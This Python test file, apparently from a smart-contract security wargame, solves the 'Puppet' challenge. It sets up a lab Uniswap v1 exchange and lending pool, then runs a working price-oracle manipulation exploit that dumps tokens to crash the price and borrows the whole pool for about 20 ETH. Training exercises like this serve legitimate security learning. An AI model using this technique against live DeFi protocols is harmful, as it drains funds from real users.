from multiprocessing import pool
from scripts.utils import *
from brownie import DamnValuableToken, PuppetPool

def test_solve_challenge():
    ####################################################################
    ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
    ####################################################################
    web3 = import_web3()

    # Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
    def calculate_token_to_eth_input_price(tokensSold, tokensInReserve, etherInReserve):
        return int(tokensSold * 997 * etherInReserve) // int(tokensInReserve * 1000 + tokensSold * 997)

    # Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    UNISWAP_INITIAL_TOKEN_RESERVE = ether_to_wei(10)
    UNISWAP_INITIAL_ETH_RESERVE = ether_to_wei(10)
    # attacker balances
    ATTACKER_INITIAL_TOKEN_BALANCE = ether_to_wei(1000)
    ATTACKER_INITIAL_ETH_BALANCE = ether_to_wei(25)
    # pool token balance
    POOL_INITIAL_TOKEN_BALANCE = ether_to_wei(100000)

    # import accounts
    deployer, _fromDeployer, attacker, _fromAttacker = define_from_acc(qty=2)

    # load uniswap contracts from ABI
    UniswapV1ExchangeABI, UniswapV1ExchangeBytecode = load_abi_and_bytecode_json('built_helper_contracts/build-uniswap-v1/UniswapV1Exchange.json')
    exchange_template = load_contract_from_abi_and_bytecode('UniswapV1Exchange', UniswapV1ExchangeABI, UniswapV1ExchangeBytecode)
    uniswap_factory = load_contract_from_abi_and_bytecode('UniswapV1Factory', None, None, load_path='built_helper_contracts/build-uniswap-v1/UniswapV1Factory.json')

    # set attacker balance to 25 ETH
    set_account_balance_network(attacker.address, hex(ether_to_wei(25)))
    # check attacker balance
    assert attacker.balance() == ATTACKER_INITIAL_ETH_BALANCE

    # deploy other contracts
    token = DamnValuableToken.deploy(_fromDeployer)
    uniswap_factory.initializeFactory(exchange_template.address, _fromDeployer)
    tx = uniswap_factory.createExchange(token.address, _fromDeployer)
    uniswap_exchange = Contract.from_abi('UniswapV1Exchange', tx.events['NewExchange']['exchange'], UniswapV1ExchangeABI)

    # deploy lending pool
    lending_pool = PuppetPool.deploy(token.address, uniswap_exchange.address, _fromDeployer)

    # add initial token and ETH liquidity to pool
    token.approve(uniswap_exchange.address, UNISWAP_INITIAL_TOKEN_RESERVE, _fromDeployer)
    uniswap_exchange.addLiquidity(0, UNISWAP_INITIAL_TOKEN_RESERVE, web3.eth.get_block('latest')['timestamp'] * 2, _fromDeployer | value_dict(UNISWAP_INITIAL_ETH_RESERVE))

    # ensure the exchange is working as expected
    assert uniswap_exchange.getTokenToEthInputPrice(ether_to_wei(1), _fromDeployer) == calculate_token_to_eth_input_price(ether_to_wei(1), UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)

    # transfer initial tokens to attacker and pool
    token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE, _fromDeployer)
    token.transfer(lending_pool.address, POOL_INITIAL_TOKEN_BALANCE, _fromDeployer)

    # check deposit required for pool
    assert lending_pool.calculateDepositRequired(ether_to_wei(1)) == ether_to_wei(2)
    assert lending_pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE) == POOL_INITIAL_TOKEN_BALANCE*2

    # check if solved
    def check_solution():
        ############################################
        ############ SUCCESS CONDITIONS ############
        ############################################

        # Attacker has taken all tokens from the pool
        assert token.balanceOf(lending_pool.address) == 0
        assert token.balanceOf(attacker.address) > POOL_INITIAL_TOKEN_BALANCE

# #########################################################
# There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
#
# There's a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.
#
# Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool. 
# #########################################################

    ##############################
    ##### SOLUTION GOES HERE #####
    ##############################

    # approve all tokens to the uniswap v1 pool
    token.approve(uniswap_exchange.address, 2**256 - 1, _fromAttacker)

    # sell all tokens to the uniswap v1 pool for as much eth as possible
    uniswap_exchange.tokenToEthSwapOutput(ether_to_wei(9.9), ether_to_wei(1000), web3.eth.get_block('latest').timestamp * 2, _fromAttacker)

    # calculate deposit required to borrow *all* tokens from the pool
    deposit_required = lending_pool.calculateDepositRequired(ether_to_wei(100000))

    # the result is ~20 ETH or so
    lending_pool.borrow(ether_to_wei(100000), _fromAttacker | value_dict(deposit_required)) 
    
    ######################
    check_solution()
